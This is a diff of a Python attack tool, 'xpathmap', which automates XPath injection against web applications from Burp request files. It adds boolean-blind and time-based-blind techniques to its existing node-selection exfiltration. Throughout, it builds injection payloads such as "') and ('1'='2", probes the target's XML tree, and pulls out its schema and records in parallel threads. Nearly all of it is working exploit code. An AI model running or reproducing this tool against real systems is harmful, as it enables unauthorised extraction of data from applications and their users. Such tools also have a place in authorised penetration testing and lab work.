+                if n > 0:
+                    yield child_xpath, child, n
+            else:
+                yield from find_record_nodes({name: child}, xpath)
+
+    def walk_records(node: dict, xpath: str):
+        if not isinstance(node, dict):
+            return
+
+        for name, child in node.items():
+            child_path = f"{xpath}/{name}"
+
+            if isinstance(child, dict) and child:
+                # Check if children are leaves → this is a record-like node
+                if all(v == "leaf" for v in child.values()):
+                    # Extract multiple instances
+                    n_records = extractor.get_count(f"{child_path}")
+                    info(f"  Records at {child_path}: {n_records}")
+                    records = []
+                    for rec_idx in range(1, min(n_records + 1, max_records + 1)):
+                        record = {}
+                        for field_name in child.keys():
+                            val = extractor.get_string(
+                                f"{child_path}[{rec_idx}]/{field_name}"
+                            )
+                            record[field_name] = val
+                        records.append(record)
+                        found(f"  Record {rec_idx}: {record}")
+                    results[child_path] = records
+                else:
+                    walk_records(child, child_path)
+
+    for root_name, root_node in schema.items():
+        walk_records(root_node, f"/{root_name}")
+
+    return results
+
+
+def print_schema(schema: dict, indent: int = 0):
+    prefix = "  " * indent
+    for name, child in schema.items():
+        if child == "leaf":
+            print(f"{prefix}{C.CYAN}<{name}/>{C.RESET}")
+        else:
+            print(f"{prefix}{C.CYAN}<{name}>{C.RESET}")
+            if isinstance(child, dict):
+                print_schema(child, indent + 1)
+            print(f"{prefix}{C.CYAN}</{name}>{C.RESET}")
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# NORMAL MODE — node-selection exfiltration (kept from previous version)
 # ──────────────────────────────────────────────────────────────────────────────
 
 def build_path(indices: list[int]) -> str:
@@ -432,10 +924,9 @@ def probe_raw(
     node_param: str, field_name: str,
     indices: list[int],
 ) -> str:
-    """Returns raw HTML for a node probe."""
     path    = build_path(indices)
     f_value = f"{field_name} | {path}"
-    return engine.send({inj_param: null_pay, node_param: f_value})
+    return engine.send_text({inj_param: null_pay, node_param: f_value})
 
 
 def find_data_path(
@@ -447,95 +938,29 @@ def find_data_path(
     max_depth: int = 8,
     max_siblings: int = 20,
 ) -> Optional[list[int]]:
-    """
-    BFS search for the first path (from base_indices) that returns data.
-
-    Problem: intermediate nodes may be at any index, not just [1].
-    Example: /*[1]/*[2]/*[3]/*[1]/*[3] — the group node is at /*[3], not /*[1].
-
-    We do a level-by-level BFS:
-      - At each depth level, try indices 1..max_siblings
-      - If a probe returns data → we found a leaf → return full path
-      - If a probe returns "array-like" empty (no data but the page loaded) →
-        that index exists but has children → add to next BFS frontier
-      - Track "alive" paths (responded without error) to explore deeper
-
-    Returns the full indices list to the first data-bearing leaf, or None.
-    """
-    # Frontier: list of partial paths to explore
     frontier: list[list[int]] = [list(base_indices)]
-    visited:  set[tuple] = set()
+    visited:  set[tuple]      = set()
 
     for _ in range(max_depth):
         next_frontier: list[list[int]] = []
-
         for path in frontier:
             if tuple(path) in visited:
                 continue
             visited.add(tuple(path))
-
-            # Try each sibling index at this level
             for idx in range(1, max_siblings + 1):
                 candidate = path + [idx]
                 raw = probe_raw(engine, inj_param, null_pay, node_param,
                                 field_name, candidate)
                 val = extractor.extract(raw)
                 debug(f"  BFS {build_path(candidate)} → {val!r}")
-
                 if val is not None:
-                    # Found data — this is a leaf node
                     return candidate
-
-                # Check if this node exists but has children (returns empty/array)
-                # Heuristic: page loaded (has HTML) but no data value
                 if raw and len(raw) > 100 and tuple(candidate) not in visited:
                     next_frontier.append(candidate)
-
         if not next_frontier:
             break
         frontier = next_frontier
-
     return None
-
-
-def detect_first_data_path(
-    engine: Engine,
-    inj_param: str, null_pay: str,
-    node_param: str, field_name: str,
-    dataset_idx: int,
-    extractor: ResponseExtractor,
-    max_depth: int = 8,
-    max_siblings: int = 20,
-) -> Optional[list[int]]:
-    """
-    Find the XPath path to the first data value in this dataset.
-    Returns full index list e.g. [1, 2, 3, 1, 1] for /*[1]/*[2]/*[3]/*[1]/*[1]
-    """
-    base = [1, dataset_idx]
-    return find_data_path(
-        engine, inj_param, null_pay, node_param, field_name,
-        base, extractor, max_depth, max_siblings,
-    )
-
-
-def exfiltrate_record(
-    engine: Engine,
-    inj_param: str, null_pay: str,
-    node_param: str, field_name: str,
-    record_path: list[int],       # path to the record node (without field index)
-    extractor: ResponseExtractor,
-    max_fields: int = 20,
-) -> list[str]:
-    """Extract all fields of one record by appending field index 1..N."""
-    values: list[str] = []
-    for field_idx in range(1, max_fields + 1):
-        raw = probe_raw(engine, inj_param, null_pay, node_param, field_name,
-                        record_path + [field_idx])
-        val = extractor.extract(raw)
-        if val is None:
-            break
-        values.append(val)
-    return values
 
 
 def collect_all_record_paths(
@@ -547,192 +972,93 @@ def collect_all_record_paths(
     max_siblings: int,
     max_records: int,
 ) -> list[list[int]]:
-    """
-    Given the path to the FIRST data leaf, reconstruct all record-level paths.
-
-    The structure is:
-      first_data_path = [root, dataset, *groups, record_idx, field_idx]
-      first_data_path[-1] = first field index (usually 1)
-      first_data_path[-2] = first record index within its group
-      first_data_path[2:-2] = intermediate group indices (may be any values)
-
-    We need to:
-      1. Iterate record_idx within each group (first_data_path[2:-1])
-      2. Iterate ALL group combinations (each intermediate level 2..-2)
-
-    Strategy: treat every level between [dataset_idx] and [record_idx] as a
-    potential "group level". We enumerate all combinations of group indices
-    and within each combination enumerate record indices.
-    """
-    # Decompose the path
-    # path = [1, ds, g1, g2, ..., gN, rec, field]
-    # prefix_fixed = [1, ds]   (never changes)
-    # group_levels = [g1, g2, ..., gN]  (0 or more intermediate group indices)
-    # rec = first_data_path[-2]
-
-    prefix_fixed  = first_data_path[:2]            # [1, dataset_idx]
-    group_indices = list(first_data_path[2:-2])    # intermediate group path
+    prefix_fixed   = first_data_path[:2]
+    group_indices  = list(first_data_path[2:-2])
     n_group_levels = len(group_indices)
-
     all_record_paths: list[list[int]] = []
 
     if n_group_levels == 0:
-        # No intermediates: path is [root, ds, rec, field]
-        # Just iterate rec_idx
         for rec_idx in range(1, max_records + 1):
             all_record_paths.append(prefix_fixed + [rec_idx])
         return all_record_paths
 
-    # We have group levels. Enumerate all combinations by probing each level.
-    # For each group level L, find valid indices by probing with a fixed suffix.
-    # We do this recursively / iteratively: build the group prefix level by level.
-
-    def enumerate_group_combos(
-        fixed_prefix: list[int],
-        remaining_levels: int,
-    ) -> list[list[int]]:
-        """Return all valid group-prefix paths of `remaining_levels` more levels."""
-        if remaining_levels == 0:
+    def enumerate_group_combos(fixed_prefix: list[int], remaining: int) -> list[list[int]]:
+        if remaining == 0:
             return [fixed_prefix]
-
         result = []
         for idx in range(1, max_siblings + 1):
-            candidate = fixed_prefix + [idx]
-            # Quick probe: append [1] for remaining levels + [1] field to check if alive
-            probe_path = candidate + [1] * (remaining_levels - 1) + [1, 1]
+            candidate  = fixed_prefix + [idx]
+            probe_path = candidate + [1] * (remaining - 1) + [1, 1]
             raw = probe_raw(engine, inj_param, null_pay, node_param, field_name, probe_path)
             val = extractor.extract(raw)
             if val is not None:
-                # This group index has data — explore further
-                sub = enumerate_group_combos(candidate, remaining_levels - 1)
-                result.extend(sub)
+                result.extend(enumerate_group_combos(candidate, remaining - 1))
             elif raw and len(raw) > 100:
-                # Group exists but need to go deeper
-                sub = enumerate_group_combos(candidate, remaining_levels - 1)
-                result.extend(sub)
+                result.extend(enumerate_group_combos(candidate, remaining - 1))
             else:
-                # Group index doesn't exist — stop scanning siblings for this level
-                # (XPath indices are contiguous from 1)
                 break
         return result
 
     group_combos = enumerate_group_combos(prefix_fixed, n_group_levels)
-    info(f"    Found {len(group_combos)} group prefix(es) to iterate")
+    info(f"    Found {len(group_combos)} group prefix(es)")
 
     for group_prefix in group_combos:
         for rec_idx in range(1, max_records + 1):
             record_path = group_prefix + [rec_idx]
-            # Quick probe field 1 to see if record exists
             raw = probe_raw(engine, inj_param, null_pay, node_param, field_name,
                             record_path + [1])
             val = extractor.extract(raw)
             if val is None:
-                break  # No more records in this group
+                break
             all_record_paths.append(record_path)
 
     return all_record_paths
 
 
-def exfiltrate_dataset(
+def exfiltrate_record_normal(
     engine: Engine,
     inj_param: str, null_pay: str,
     node_param: str, field_name: str,
-    dataset_idx: int,
+    record_path: list[int],
     extractor: ResponseExtractor,
-    max_depth: int, max_records: int, max_fields: int,
-    max_siblings: int = 20,
-    threads: int = 5,
-) -> list[list[str]]:
-    print()
-    info(f"Scanning dataset /*[1]/*[{dataset_idx}] ...")
-
-    # Step 1: find path to first data value via BFS
-    first_path = detect_first_data_path(
-        engine, inj_param, null_pay, node_param, field_name,
-        dataset_idx, extractor, max_depth, max_siblings,
-    )
-    if first_path is None:
-        warn(f"    Dataset /*[1]/*[{dataset_idx}] not found or empty.")
-        return []
-
-    info(f"    First data path: {build_path(first_path)}")
-
-    if len(first_path) < 4:
-        warn("    Path too short to decompose into record/field structure.")
-        return []
-
-    # Step 2: collect ALL record-level paths (handles groups at any index)
-    info("    Enumerating all record paths (iterating groups)...")
-    record_paths = collect_all_record_paths(
-        engine, inj_param, null_pay, node_param, field_name,
-        first_path, extractor, max_siblings, max_records,
-    )
-    info(f"    Total records to fetch: {len(record_paths)}")
-
-    if not record_paths:
-        warn("    No record paths found.")
-        return []
-
-    # Step 3: fetch all records in parallel
-    records_map: dict[int, list[str]] = {}
-    lock = Lock()
-    counter = [0]
-
-    def fetch_record(idx_path: tuple[int, list[int]]) -> tuple[int, list[str]]:
-        order, rpath = idx_path
-        rec = exfiltrate_record(
-            engine, inj_param, null_pay, node_param, field_name,
-            rpath, extractor, max_fields,
-        )
-        return order, rec
-
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = {
-            executor.submit(fetch_record, (i, p)): i
-            for i, p in enumerate(record_paths)
-        }
-        for future in as_completed(futures):
-            order, rec = future.result()
-            if rec:
-                with lock:
-                    records_map[order] = rec
-                    counter[0] += 1
-                    found(f"Record {counter[0]:>4} {build_path(record_paths[order])}: {' | '.join(rec)}")
-
-    # Return records in original order
-    records = [records_map[i] for i in sorted(records_map)]
-    return records
+    max_fields: int = 20,
+) -> list[str]:
+    values: list[str] = []
+    for field_idx in range(1, max_fields + 1):
+        raw = probe_raw(engine, inj_param, null_pay, node_param, field_name,
+                        record_path + [field_idx])
+        val = extractor.extract(raw)
+        if val is None:
+            break
+        values.append(val)
+    return values
 
 
-def run_node_selection(
+def run_normal(
     engine: Engine,
-    inj_param: str, null_pay: str,
-    node_param: str, field_name: str,
+    ctx: InjectionContext,
     extractor: ResponseExtractor,
     max_datasets: int, max_depth: int,
     max_records: int, max_fields: int,
-    max_siblings: int = 20,
-    threads: int = 5,
+    max_siblings: int, threads: int,
 ) -> dict[int, list[list[str]]]:
-    info(f"Node-selection | inj='{inj_param}' node='{node_param}' field='{field_name}'")
+    info(f"Running NORMAL exfiltration | inj='{ctx.inj_param}' node='{ctx.node_param}' field='{ctx.field_name}'")
 
-    # ── Calibrate extractor ───────────────────────────────────────────────────
-    # Find ANY data response quickly using simple [1,1,...] probe
+    # Calibrate extractor
     info("Calibrating response extractor...")
-    null_html = engine.send({inj_param: null_pay})
+    null_html = engine.send_text({ctx.inj_param: ctx.null_payload})
     calibrated = False
-
     for ds in range(1, 3):
         for extra in range(1, max_depth + 1):
             indices   = [1, ds] + [1] * extra
-            data_html = probe_raw(engine, inj_param, null_pay, node_param, field_name, indices)
+            data_html = probe_raw(engine, ctx.inj_param, ctx.null_payload,
+                                  ctx.node_param, ctx.field_name, indices)
             for pattern in ResponseExtractor.RESULT_PATTERNS:
                 m = re.search(pattern, data_html, re.IGNORECASE | re.DOTALL)
                 if m:
                     known = m.group(1).strip()
                     if known and "no result" not in known.lower() and len(known) < 200:
-                        extractor.calibrate(null_html, data_html, known)
-                        calibrated = True
+                        calibrated = extractor.calibrate(null_html, data_html, known)
                         break
             if calibrated:
                 break
@@ -740,20 +1066,67 @@ def run_node_selection(
             break
 
     if not calibrated:
-        warn("Could not calibrate via simple probe — will use best-effort extraction")
-        extractor._mode = "strip_diff"
+        extractor._mode         = "strip_diff"
         extractor._null_stripped = ResponseExtractor._strip_html(null_html)
 
-    # ── Exfiltrate all datasets ───────────────────────────────────────────────
     all_data: dict[int, list[list[str]]] = {}
     consecutive_empty = 0
 
     for ds_idx in range(1, max_datasets + 1):
-        records = exfiltrate_dataset(
-            engine, inj_param, null_pay, node_param, field_name,
-            ds_idx, extractor, max_depth, max_records, max_fields,
-            max_siblings=max_siblings, threads=threads,
+        print()
+        info(f"Scanning dataset /*[1]/*[{ds_idx}] ...")
+
+        first_path = find_data_path(
+            engine, ctx.inj_param, ctx.null_payload,
+            ctx.node_param, ctx.field_name,
+            [1, ds_idx], extractor, max_depth, max_siblings,
         )
+        if first_path is None:
+            warn(f"    Dataset /*[1]/*[{ds_idx}] not found.")
+            consecutive_empty += 1
+            if consecutive_empty >= 2:
+                info("Two consecutive empty datasets — stopping.")
+                break
+            continue
+
+        info(f"    First data path: {build_path(first_path)}")
+        if len(first_path) < 4:
+            continue
+
+        record_paths = collect_all_record_paths(
+            engine, ctx.inj_param, ctx.null_payload,
+            ctx.node_param, ctx.field_name,
+            first_path, extractor, max_siblings, max_records,
+        )
+        info(f"    Records to fetch: {len(record_paths)}")
+
+        records_map: dict[int, list[str]] = {}
+        lock    = Lock()
+        counter = [0]
+
+        def fetch(idx_path: tuple[int, list[int]]) -> tuple[int, list[str]]:
+            order, rpath = idx_path
+            rec = exfiltrate_record_normal(
+                engine, ctx.inj_param, ctx.null_payload,
+                ctx.node_param, ctx.field_name,
+                rpath, extractor, max_fields,
+            )
+            return order, rec
+
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = {
+                executor.submit(fetch, (i, p)): i
+                for i, p in enumerate(record_paths)
+            }
+            for future in as_completed(futures):
+                order, rec = future.result()
+                if rec:
+                    with lock:
+                        records_map[order] = rec
+                        counter[0] += 1
+                        found(f"Record {counter[0]:>4} {build_path(record_paths[order])}: {' | '.join(rec)}")
+
+        records = [records_map[i] for i in sorted(records_map)]
         if records:
             all_data[ds_idx] = records
             consecutive_empty = 0
@@ -767,100 +1140,45 @@ def run_node_selection(
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Predicate method
+# XML output
 # ──────────────────────────────────────────────────────────────────────────────
 
-def run_predicate(
-    engine: Engine,
-    inj_param: str,
-    extractor: ResponseExtractor,
-    null_pay: str,
-    step: int,
-    max_records: int,
-) -> list[str]:
-    info(f"Predicate exfiltration via position() | param='{inj_param}' step={step}")
-
-    null_html = engine.send({inj_param: null_pay})
-    extractor._null_stripped = ResponseExtractor._strip_html(null_html)
-    extractor._mode = "strip_diff"
-
-    results: list[str] = []
-    position = 0
-
-    while position < max_records:
-        payload = f"') and (position()>{position}) and ('1'='1"
-        raw     = engine.send({inj_param: payload})
-        val     = extractor.extract(raw)
-
-        if val is None:
-            info(f"    No data at position()>{position}. Done.")
-            break
-
-        batch = [v.strip() for v in val.split() if v.strip()]
-        results.extend(batch)
-        found(f"position()>{position}: {batch}")
-        position += step
-
-    return results
-
-
-# ──────────────────────────────────────────────────────────────────────────────
-# XML reconstruction
-# ──────────────────────────────────────────────────────────────────────────────
-
-def build_xml(data: dict[int, list[list[str]]], field_name: str) -> str:
-    """
-    Reconstruct an XML document from the extracted data.
-    Node names are inferred where possible; otherwise generic names are used.
-
-    Structure mirrors what we traversed:
-      <root>
-        <dataset_1>
-          <record>
-            <field_1>value</field_1>
-            ...
-          </record>
-        </dataset_1>
-        <dataset_2>
-          ...
-        </dataset_2>
-      </root>
-    """
+def build_xml_normal(data: dict[int, list[list[str]]], field_name: str) -> str:
     root = ET.Element("root")
-
     for ds_idx, records in data.items():
-        # If only one dataset and we know the field name, use it as context
-        ds_tag = f"dataset_{ds_idx}"
-        ds_el  = ET.SubElement(root, ds_tag)
-
-        # Try to guess field names from the first record + known field_name
-        # Field index 1 usually corresponds to the field_name we queried
+        ds_el = ET.SubElement(root, f"dataset_{ds_idx}")
         n_fields = max((len(r) for r in records), default=0)
-        field_names: list[str] = []
-        for fi in range(n_fields):
-            if fi == 0 and field_name and field_name not in ("text()", ""):
-                field_names.append(field_name)
-            else:
-                field_names.append(f"field_{fi + 1}")
-
+        field_names = [field_name if i == 0 else f"field_{i+1}" for i in range(n_fields)]
         for rec_idx, record in enumerate(records, 1):
             rec_el = ET.SubElement(ds_el, "record")
             rec_el.set("index", str(rec_idx))
             for fi, value in enumerate(record):
-                fname  = field_names[fi] if fi < len(field_names) else f"field_{fi + 1}"
-                f_el   = ET.SubElement(rec_el, fname)
-                f_el.text = value
+                fname = field_names[fi] if fi < len(field_names) else f"field_{fi+1}"
+                ET.SubElement(rec_el, fname).text = value
+    return _pretty_xml(root)
 
-    # Pretty-print
-    raw_xml = ET.tostring(root, encoding="unicode")
+
+def build_xml_blind(data: dict[str, list[dict]]) -> str:
+    root = ET.Element("root")
+    for path, records in data.items():
+        safe_tag = path.strip("/").replace("/", "_").replace("[", "").replace("]", "")
+        ds_el = ET.SubElement(root, safe_tag or "dataset")
+        for rec_idx, record in enumerate(records, 1):
+            rec_el = ET.SubElement(ds_el, "record")
+            rec_el.set("index", str(rec_idx))
+            for field, value in record.items():
+                ET.SubElement(rec_el, field).text = value
+    return _pretty_xml(root)
+
+
+def _pretty_xml(root: ET.Element) -> str:
+    raw = ET.tostring(root, encoding="unicode")
     try:
-        pretty = xml.dom.minidom.parseString(raw_xml).toprettyxml(indent="  ")
-        # Remove the <?xml ...?> declaration line minidom adds
-        lines  = pretty.splitlines()
-        pretty = "\n".join(lines[1:])
-        return pretty
+        pretty = xml.dom.minidom.parseString(raw).toprettyxml(indent="  ")
+        lines  = pretty.splitlines()[1:]
+        return "\n".join(lines)
     except Exception:
-        return raw_xml
+        return raw
 
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -873,19 +1191,29 @@ def print_summary(data, xml_str: Optional[str] = None):
     print(f"{C.BOLD}  EXTRACTION RESULTS{C.RESET}")
     print(f"{C.BOLD}{'='*60}{C.RESET}")
 
-    if isinstance(data, dict):
-        total = sum(len(v) for v in data.values())
-        print(f"  Datasets: {len(data)}   Total records: {total}")
-        for ds_idx, records in data.items():
-            print(f"\n  {C.CYAN}Dataset [{ds_idx}]{C.RESET}  —  {len(records)} records")
-            print(f"  {'-'*50}")
-            for i, rec in enumerate(records, 1):
-                print(f"    [{i:>3}]  {' | '.join(rec)}")
+    if isinstance(data, dict) and data:
+        # Normal mode: {ds_idx: [[fields]]}
+        if all(isinstance(k, int) for k in data):
+            total = sum(len(v) for v in data.values())
+            print(f"  Datasets: {len(data)}   Total records: {total}")
+            for ds_idx, records in data.items():
+                print(f"\n  {C.CYAN}Dataset [{ds_idx}]{C.RESET}  —  {len(records)} records")
+                print(f"  {'-'*50}")
+                for i, rec in enumerate(records, 1):
+                    print(f"    [{i:>4}]  {' | '.join(rec)}")
+        # Blind mode: {xpath_path: [{field: val}]}
+        else:
+            for path, records in data.items():
+                print(f"\n  {C.CYAN}{path}{C.RESET}  —  {len(records)} records")
+                print(f"  {'-'*50}")
+                for i, rec in enumerate(records, 1):
+                    vals = " | ".join(f"{k}={v}" for k, v in rec.items())
+                    print(f"    [{i:>4}]  {vals}")
     elif isinstance(data, list):
-        print(f"  Total items: {len(data)}")
-        print(f"  {'-'*50}")
         for i, item in enumerate(data, 1):
-            print(f"    [{i:>3}]  {item}")
+            print(f"  [{i:>4}]  {item}")
+    else:
+        warn("No data extracted.")
 
     if xml_str:
         print(f"\n{C.CYAN}{'─'*60}{C.RESET}")
@@ -908,6 +1236,7 @@ BANNER = f"""{C.CYAN}{C.BOLD}
   ██╔╝ ██╗██║     ██║  ██║   ██║   ██║  ██║██║ ╚═╝ ██║██║  ██║██║
   ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
 {C.RESET}{C.YELLOW}  Automated XPath Injection & Data Exfiltration Tool{C.RESET}
+{C.GRAY}  Techniques: normal | boolean-blind | time-based-blind{C.RESET}
 """
 
 
@@ -915,38 +1244,54 @@ def parse_args():
     p = argparse.ArgumentParser(
         description="xpathmap — XPath injection tool (reads Burp request files)"
     )
-    p.add_argument("-r", "--request", required=True,
+    p.add_argument("-r", "--request",  required=True,
                    help="Path to raw Burp Suite HTTP request file")
-    p.add_argument("-v", "--verbose", action="store_true",
-                   help="Print every request/response for debugging")
-    p.add_argument("--method", choices=["auto", "node_selection", "predicate"],
-                   default="auto")
+    p.add_argument("-v", "--verbose",  action="store_true")
+
+    # Technique
+    p.add_argument("--technique", choices=["auto", "normal", "boolean", "time"],
+                   default="auto",
+                   help="Injection technique (default: auto-detect)")
+
+    # Override detection
     p.add_argument("--injectable-param", default=None,
-                   help="Force injectable parameter (e.g. q)")
-    p.add_argument("--node-param", default=None,
-                   help="Force node-selection parameter (e.g. f)")
-    p.add_argument("--field", default=None,
+                   help="Force injectable parameter (e.g. q or username)")
+    p.add_argument("--node-param",       default=None,
+                   help="Force node-selection parameter (normal mode, e.g. f)")
+    p.add_argument("--field",            default=None,
                    help="XPath field name in node param (e.g. streetname)")
-    p.add_argument("--null-payload", default=None,
-                   help="Force null payload string")
-    p.add_argument("--xml", default=None, metavar="FILE",
+    p.add_argument("--null-payload",     default=None,
+                   help="Force null/false payload")
+    p.add_argument("--true-marker",      default=None,
+                   help="String in response that indicates TRUE (boolean mode)")
+    p.add_argument("--false-marker",     default=None,
+                   help="String in response that indicates FALSE (boolean mode)")
+    p.add_argument("--time-threshold",   type=float, default=None,
+                   help="Response time threshold in seconds (time mode)")
+
+    # Output
+    p.add_argument("--xml",  default=None, metavar="FILE",
                    help="Save reconstructed XML to file")
+    p.add_argument("--result-start", default=None,
+                   help="Regex start of result value (normal mode)")
+    p.add_argument("--result-end",   default=None,
+                   help="Regex end of result value (normal mode)")
+
+    # Tuning
     p.add_argument("--delay",          type=float, default=0.1)
     p.add_argument("--proxy",          default=None)
     p.add_argument("--timeout",        type=int,   default=15)
+    p.add_argument("--threads",        type=int,   default=5,
+                   help="Parallel threads for record fetching (default: 5)")
     p.add_argument("--max-datasets",   type=int,   default=6)
     p.add_argument("--max-depth",      type=int,   default=8)
     p.add_argument("--max-records",    type=int,   default=500)
     p.add_argument("--max-fields",     type=int,   default=20)
-    p.add_argument("--predicate-step", type=int,   default=5)
-    p.add_argument("--max-siblings",   type=int,   default=20,
-                   help="Max sibling indices to probe per BFS level (default: 20)")
-    p.add_argument("--threads",        type=int,   default=5,
-                   help="Number of threads for parallel record fetching (default: 5)")
-    p.add_argument("--result-start",   default=None,
-                   help="Regex pattern marking start of result value (e.g. 'Results:.*?<br><br>')")
-    p.add_argument("--result-end",     default=None,
-                   help="Regex pattern marking end of result value (e.g. '</center>')")
+    p.add_argument("--max-siblings",   type=int,   default=20)
+    p.add_argument("--time-samples",   type=int,   default=5,
+                   help="Requests per timing measurement (time mode, default: 5)")
+    p.add_argument("--max-blind-records", type=int, default=50,
+                   help="Max records per node in blind mode (default: 50)")
     return p.parse_args()
 
 
@@ -970,86 +1315,89 @@ def main():
     proxies    = {"http": args.proxy, "https": args.proxy} if args.proxy else None
     engine     = Engine(req=req, delay=args.delay, proxies=proxies, timeout=args.timeout)
     all_params = list(req.all_params.keys())
+    inj_candidates = ([args.injectable_param] if args.injectable_param else all_params)
 
-    # ── Resolve injectable param ──────────────────────────────────────────────
-    inj_param:  Optional[str] = args.injectable_param
-    null_pay:   Optional[str] = args.null_payload
-    node_param: Optional[str] = args.node_param
-    field_name: Optional[str] = args.field
-
-    if inj_param and null_pay:
-        success(f"Using forced: inj='{inj_param}'  payload={null_pay!r}")
-    elif inj_param:
-        node_hint  = node_param or next((p for p in all_params if p != inj_param), None)
-        field_hint = field_name or (get_field_from_param(engine, node_hint) if node_hint else None)
-        _, null_pay = detect_injectable_param(
-            engine, [inj_param], node_param=node_hint, node_field=field_hint
-        )
-        if not null_pay:
-            warn("Could not detect null payload — using canonical: ') and ('1'='2")
-            null_pay = "') and ('1'='2"
-    else:
-        node_hint  = node_param or next((p for p in all_params if p != all_params[0]), None)
-        field_hint = field_name or (get_field_from_param(engine, node_hint) if node_hint else None)
-        inj_param, null_pay = detect_injectable_param(
-            engine, all_params, node_param=node_hint, node_field=field_hint
-        )
-        if not inj_param:
-            error(
-                "Could not auto-detect injectable parameter.\n"
-                "  Try: --injectable-param q --node-param f --field streetname\n"
-                "  Or add -v for debug output."
-            )
-            sys.exit(1)
-
-    # ── Resolve method ────────────────────────────────────────────────────────
-    method = args.method
-    if method == "auto":
-        remaining = [p for p in all_params if p != inj_param]
-        method    = "node_selection" if remaining else "predicate"
-        info(f"Method: {C.BOLD}{method}{C.RESET}")
-
-    # ── Resolve node param ────────────────────────────────────────────────────
-    if method == "node_selection":
-        if not node_param:
-            remaining = [p for p in all_params if p != inj_param]
-            if not remaining:
-                warn("No second parameter — switching to predicate.")
-                method = "predicate"
-            else:
-                node_param, _ = detect_node_param(engine, inj_param, null_pay, remaining)
-                if not node_param:
-                    node_param = remaining[0]
-                    warn(f"Assuming node param: '{node_param}'")
-
-        if method == "node_selection" and not field_name:
-            field_name = get_field_from_param(engine, node_param) if node_param else "text()"
-            info(f"Field: '{field_name}'")
-
-    # ── Run ───────────────────────────────────────────────────────────────────
-    print()
-    extractor = ResponseExtractor()
-
-    # Inject custom regex pattern if user provided start/end markers
+    # ── Custom regex for normal mode ──────────────────────────────────────────
     if args.result_start or args.result_end:
-        start = args.result_start or ""
-        end   = args.result_end   or ""
-        custom_pattern = f"{start}(.+?){end}"
-        info(f"Using custom result pattern: {custom_pattern!r}")
-        # Prepend so it's tried first
-        ResponseExtractor.RESULT_PATTERNS.insert(0, custom_pattern)
+        custom = f"{args.result_start or ''}(.+?){args.result_end or ''}"
+        ResponseExtractor.RESULT_PATTERNS.insert(0, custom)
+        info(f"Custom result pattern: {custom!r}")
 
-    if method == "node_selection":
-        data = run_node_selection(
-            engine, inj_param, null_pay, node_param, field_name, extractor,
-            args.max_datasets, args.max_depth, args.max_records, args.max_fields,
-            max_siblings=args.max_siblings, threads=args.threads,
+    # ── Handle fully-forced context (skip all detection) ─────────────────────
+    ctx: Optional[InjectionContext] = None
+
+    if args.injectable_param and args.null_payload and args.technique != "auto":
+        tech = args.technique
+        ctx  = InjectionContext(
+            technique=tech,
+            inj_param=args.injectable_param,
+            null_payload=args.null_payload,
+            node_param=args.node_param  or "",
+            field_name=args.field       or "",
+            true_marker=args.true_marker   or "",
+            false_marker=args.false_marker or "",
+            time_threshold=args.time_threshold or 0.0,
         )
-        xml_str = build_xml(data, field_name) if data else None
+        success(f"Using forced context: technique={tech} inj='{ctx.inj_param}'")
     else:
-        data    = run_predicate(engine, inj_param, extractor, null_pay,
-                                args.predicate_step, args.max_records)
-        xml_str = None
+        force_tech = None if args.technique == "auto" else args.technique
+        ctx = auto_detect_technique(engine, inj_candidates, force_technique=force_tech)
+
+    if ctx is None:
+        error(
+            "Could not detect any XPath injection.\n"
+            "  Tips:\n"
+            "    -v  for verbose output\n"
+            "    --injectable-param username --technique boolean\n"
+            "    --injectable-param q --node-param f --field streetname --technique normal\n"
+        )
+        sys.exit(1)
+
+    # ── Run appropriate technique ─────────────────────────────────────────────
+    print()
+    info(f"Technique: {C.BOLD}{ctx.technique.upper()}{C.RESET}  param='{ctx.inj_param}'")
+    xml_str = None
+    data    = None
+
+    if ctx.technique == "normal":
+        # Ensure we have node_param and field_name
+        if not ctx.node_param:
+            node_candidates = [p for p in all_params if p != ctx.inj_param]
+            ctx.node_param, ctx.field_name = _find_node_param(
+                engine, ctx.inj_param, ctx.null_payload, node_candidates
+            )
+            if not ctx.node_param and node_candidates:
+                ctx.node_param = node_candidates[0]
+                ctx.field_name = (engine.req.params.get(ctx.node_param) or
+                                  engine.req.body_params.get(ctx.node_param, "text()"))
+        if args.field:
+            ctx.field_name = args.field
+        if args.node_param:
+            ctx.node_param = args.node_param
+
+        re_extractor = ResponseExtractor()
+        data    = run_normal(
+            engine, ctx, re_extractor,
+            args.max_datasets, args.max_depth,
+            args.max_records, args.max_fields,
+            args.max_siblings, args.threads,
+        )
+        xml_str = build_xml_normal(data, ctx.field_name) if data else None
+
+    elif ctx.technique in ("boolean", "time"):
+        oracle    = Oracle(engine, ctx)
+        bextract  = BlindExtractor(oracle, threads=args.threads)
+
+        # Schema exfiltration
+        schema = blind_exfiltrate_schema(bextract, max_depth=args.max_depth)
+        print()
+        info("Discovered schema:")
+        print_schema(schema)
+
+        # Data exfiltration
+        print()
+        data    = blind_exfiltrate_data(bextract, schema, max_records=args.max_blind_records)
+        xml_str = build_xml_blind(data) if data else None
 
     # ── Output ────────────────────────────────────────────────────────────────
     print_summary(data, xml_str if not args.xml else None)
@@ -1059,7 +1407,7 @@ def main():
             fh.write(xml_str)
         success(f"XML saved to: {args.xml}")
     elif args.xml and not xml_str:
-        warn("No data extracted — XML file not saved.")
+        warn("No data to save.")
 
 
 if __name__ == "__main__":
